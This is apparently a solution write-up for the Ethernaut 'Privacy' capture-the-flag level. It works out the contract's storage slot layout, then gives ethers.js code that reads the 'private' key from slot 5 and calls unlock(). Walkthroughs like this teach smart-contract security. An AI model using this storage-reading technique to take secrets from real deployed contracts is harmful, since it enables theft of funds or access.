# Solution

To beat this level you need to read `data` array last element from the Privacy storage.

1. Reckon a storage slot number to read from:
```solidity
  bool public locked = true; // --> slot 0
  uint256 public ID = block.timestamp; // --> slot 1
  // next 3 slots are packed into one
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp); // --> slot 2
  bytes32[3] private data; // --> slots 3, 4, 5
```
Thus, you need to read data from a slot #5

2. Read a word (32 bytes) from the slot 5 off-chain using ethers.js
```typescript
const slot5 = await ethers.provider.getStorageAt(privacy.address, 5);
```
3. Convert `bytes32` to `bytes16`. Take the first 16 bytes of the word:
```typescript
const unlockKey = ethers.utils.hexlify(
  ethers.utils.arrayify(slot5).subarray(0, 16),
);
```
4. Unlock Storage
```typescript
const unlockTx = await privacy.unlock(unlockKey);
```

See a working solution in `test/Privacy.exploit.test.ts`
